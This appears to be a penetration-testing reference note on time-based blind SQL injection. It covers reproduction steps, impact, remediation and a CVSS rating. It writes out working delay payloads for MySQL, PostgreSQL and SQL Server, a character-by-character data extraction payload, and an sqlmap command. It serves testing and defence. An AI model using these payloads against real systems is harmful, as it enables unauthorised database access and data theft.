# Description
Time-Based SQL Injection is a type of Blind SQL Injection where an attacker exploits database delay functions to infer information based on response time.

Since the application does not return visible data or errors, attackers send payloads that cause the database to delay its response. By measuring the delay, they determine whether a condition is true or false.

This technique is commonly used when:
- No error messages are displayed
- No visible response differences exist
- Only response timing can be observed
It is a subtype of [[Blind SQL Injection]].
## Steps to Reproduce

### 1. Identify Input Points
Locate parameters interacting with the database:
- URL parameters (`id=1`)
- Search forms
- Login fields
- API endpoints
### 2. Establish Baseline Response Time
Send a normal request:
```http
http://example.com/page?id=1
```
Note the average response time.
### 3. Inject Time Delay Payload
Try database-specific delay payloads:
#### MySQL
```sql
' AND SLEEP(5)-- 
```
#### PostgreSQL
```sql
' AND pg_sleep(5)-- 
```
#### Microsoft SQL Server
```sql
' WAITFOR DELAY '0:0:5'-- 
```
### 4. Observe Response Delay
- If response is delayed (~5 seconds) → condition is TRUE
- If no delay → condition is FALSE
### 5. Confirm Injection with Conditional Payload
```sql
' AND IF(1=1, SLEEP(5), 0)-- 
' AND IF(1=2, SLEEP(5), 0)-- 
```
- First query → delayed
- Second query → normal
→ Confirms vulnerability
### 6. Extract Data (Inference-Based)
Attackers can extract data character-by-character using conditions:
```sql
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- 
```
### 7. Optional Automation
Use:
- sqlmap
```bash
sqlmap -u "http://example.com/page?id=1" --technique=T
```
## Impact
Time-Based SQL Injection can lead to:
- Extraction of sensitive database information
- Authentication bypass
- Enumeration of database structure
- Full database compromise (slow but reliable)
Although slower than other SQLi types, it is highly effective and difficult to detect.
## Remediation
1. Use **Parameterized Queries (Prepared Statements)**
2. Validate and sanitize all user inputs
3. Use ORM frameworks
4. Implement proper error handling and avoid logic leak
5. Apply least privilege to database accounts
6. Use Web Application Firewalls (WAF)
7. Monitor unusual response delays and query patterns
## Severity

**High to Critical**

- No direct output required    
- Works even in highly restricted environments
- Allows full data extraction over time
## CVSS (v3.1)
```id="tm7"
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```
**Score:** 9.8 (Critical)
